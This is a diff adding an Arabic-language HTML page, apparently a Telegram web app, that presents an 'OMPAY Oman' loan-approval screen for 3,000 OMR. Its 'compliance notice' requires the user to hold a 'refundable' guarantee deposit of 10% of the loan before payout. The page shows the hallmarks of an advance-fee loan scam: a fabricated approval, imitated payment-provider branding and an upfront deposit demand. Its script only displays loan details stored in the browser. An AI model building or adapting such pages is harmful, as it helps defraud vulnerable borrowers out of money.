@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>OMPAY عمان - تمت الموافقة</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        :root {
+            --ompay-primary: #004b87;
+            --ompay-blue-light: #0077b6;
+            --bg-ompay: #004b87;
+            --card-bg: #ffffff;
+            --text-dark: #1e293b;
+            --text-gray: #64748b;
+            --warning-bg: #f8fafc;
+            --warning-border: #e2e8f0;
+            --warning-title: #0284c7;
+        }
+
+        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { background-color: var(--bg-ompay); margin: 0; padding: 20px 15px; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
+
+        .screen-container {
+            width: 100%; max-width: 400px; background-color: var(--card-bg); border-radius: 28px;
+            padding: 30px 20px; box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15); display: flex; flex-direction: column; align-items: center;
+        }
+
+        .check-circle {
+            width: 80px; height: 80px; background: linear-gradient(135deg, var(--ompay-blue-light), var(--ompay-primary));
+            color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 38px;
+            font-weight: 900; margin-bottom: 20px; box-shadow: 0 6px 16px rgba(0, 75, 135, 0.3);
+        }
+
+        .congrats-title { font-size: 24px; font-weight: 800; color: #1e293b; display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 12px; }
+        .sub-text { color: var(--text-gray); font-size: 15px; text-align: center; line-height: 1.4; margin-bottom: 25px; padding: 0 10px; }
+
+        .amount-box {
+            width: 100%; background: linear-gradient(180deg, var(--ompay-blue-light) 0%, var(--ompay-primary) 100%);
+            border-radius: 16px; padding: 22px 15px; text-align: center; color: white; margin-bottom: 25px;
+            box-shadow: 0 4px 15px rgba(0, 75, 135, 0.25);
+        }
+        .amount-label { font-size: 12px; font-weight: 800; text-transform: uppercase; letter-spacing: 0.8px; opacity: 0.95; margin-bottom: 8px; }
+        .amount-value { font-size: 30px; font-weight: 900; }
+
+        .info-card {
+            width: 100%; background-color: var(--warning-bg); border: 1.5px solid var(--warning-border);
+            border-radius: 16px; padding: 20px 18px; margin-bottom: 25px;
+        }
+        .info-header { display: flex; align-items: center; gap: 8px; margin-bottom: 12px; color: var(--warning-title); font-weight: 800; font-size: 14px; }
+        .info-body { font-size: 13.5px; line-height: 1.55; color: #475569; }
+
+        .details-list { width: 100%; margin-bottom: 20px; }
+        .details-heading { display: flex; align-items: center; gap: 10px; margin-bottom: 18px; font-size: 16px; font-weight: 800; color: var(--text-dark); }
+        .detail-item { display: flex; align-items: center; gap: 15px; margin-bottom: 16px; }
+        .icon-bg { width: 44px; height: 44px; background-color: #f0f4f8; border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 20px; }
+        .detail-label { font-size: 11px; color: var(--text-gray); text-transform: uppercase; font-weight: 700; margin-bottom: 2px; }
+        .detail-val { font-size: 15px; font-weight: 800; color: var(--text-dark); }
+
+        .action-title { width: 100%; font-weight: 800; margin: 15px 0 12px; color: var(--ompay-primary); font-size: 15px; }
+        .btn-list { width: 100%; display: flex; flex-direction: column; gap: 10px; margin-bottom: 20px; }
+        .btn-white { background: white; border: 1px solid #cbd5e1; padding: 14px 16px; border-radius: 12px; font-weight: 700; color: var(--text-dark); display: flex; align-items: center; gap: 10px; font-size: 14px; }
+
+        .next-steps { width: 100%; background-color: #f8fafc; padding: 16px; border-radius: 12px; margin-bottom: 20px; border: 1px solid #e2e8f0; }
+        .home-btn { background-color: var(--ompay-primary); color: white; border: none; width: 100%; padding: 16px; border-radius: 12px; font-size: 16px; font-weight: 800; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+    <div class="screen-container">
+        <div class="check-circle">✓</div>
+        
+        <div class="congrats-title">
+            <span>🎉</span> مبروك!
+        </div>
+
+        <div class="sub-text">
+            تمت <b>الموافقة على طلب القرض الخاص بك!</b> سيتم صرف الأموال قريبًا.
+        </div>
+
+        <div class="amount-box">
+            <div class="amount-label">المبلغ المعتمد</div>
+            <div class="amount-value" id="display-amount">3,000 ر.ع.</div>
+        </div>
+
+        <div class="info-card">
+            <div class="info-header">⚠️ إشعار الامتثال</div>
+            <div class="info-body">
+                يجب أن يكون حساب OMPAY الخاص بك نشطاً وأن يحافظ على وديعة ضمان لا تقل عن <b>10% من مبلغ القرض المطلوب</b>. هذه الوديعة قابلة للاسترداد بالكامل بعد سداد القرض بنجاح وتساعد في الحصول على معدلات فائدة أفضل.
+            </div>
+        </div>
+
+        <div class="details-list">
+            <div class="details-heading"><span>💳</span> تفاصيل القرض</div>
+
+            <div class="detail-item">
+                <div class="icon-bg">🇴🇲</div>
+                <div>
+                    <div class="detail-label">رقم الهاتف</div>
+                    <div class="detail-val" id="display-phone">+968 ...</div>
+                </div>
+            </div>
+
+            <div class="detail-item">
+                <div class="icon-bg">💵</div>
+                <div>
+                    <div class="detail-label">القسط الشهري</div>
+                    <div class="detail-val" id="display-monthly">270 ر.ع.</div>
+                </div>
+            </div>
+
+            <div class="detail-item">
+                <div class="icon-bg">📅</div>
+                <div>
+                    <div class="detail-label">مدة القرض</div>
+                    <div class="detail-val" id="display-term">12 شهر</div>
+                </div>
+            </div>
+
+            <div class="detail-item">
+                <div class="icon-bg">📈</div>
+                <div>
+                    <div class="detail-label">معدل الفائدة</div>
+                    <div class="detail-val">5% سنوية</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="action-title">إجراءات سريعة</div>
+        <div class="btn-list">
+            <div class="btn-white">💰 إيداع</div>
+            <div class="btn-white">💸 سحب</div>
+            <div class="btn-white">📄 التفاصيل</div>
+        </div>
+
+        <div class="next-steps">
+            <div style="font-weight: 800; color: var(--ompay-primary); margin-bottom: 6px; font-size: 14px;">📱 الخطوات التالية:</div>
+            <div style="font-size: 13px; color: var(--text-gray); line-height: 1.45;">
+                ستتلقى رسالة نصية قصيرة (SMS) وبريداً إلكترونياً يتضمن تفاصيل الصرف خلال 24 ساعة.
+            </div>
+        </div>
+
+        <button class="home-btn" onclick="window.location.href='/page1'">العودة إلى الرئيسية</button>
+    </div>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", () => {
+            if (window.Telegram?.WebApp) {
+                window.Telegram.WebApp.ready();
+                window.Telegram.WebApp.expand();
+            }
+
+            const savedPhone = localStorage.getItem('phone') || localStorage.getItem('userPhone');
+            const loanAmount = localStorage.getItem('loan_amount') || localStorage.getItem('amount') || "3000";
+            const loanTerm = localStorage.getItem('loan_term') || localStorage.getItem('duration') || "12";
+            const monthlyPay = localStorage.getItem('monthly_repayment') || "270";
+
+            const formattedAmount = Number(loanAmount).toLocaleString('en-US') + " ر.ع.";
+            const formattedMonthly = Number(monthlyPay).toLocaleString('en-US') + " ر.ع.";
+            const formattedPhone = savedPhone ? `+968 ${savedPhone.replace(/^\+?968/, '')}` : "+968 ...";
+
+            document.getElementById('display-amount').innerText = formattedAmount;
+            document.getElementById('display-phone').innerText = formattedPhone;
+            document.getElementById('display-term').innerText = loanTerm + " شهر";
+            document.getElementById('display-monthly').innerText = formattedMonthly;
+        });
+    </script>
+</body>
+</html>
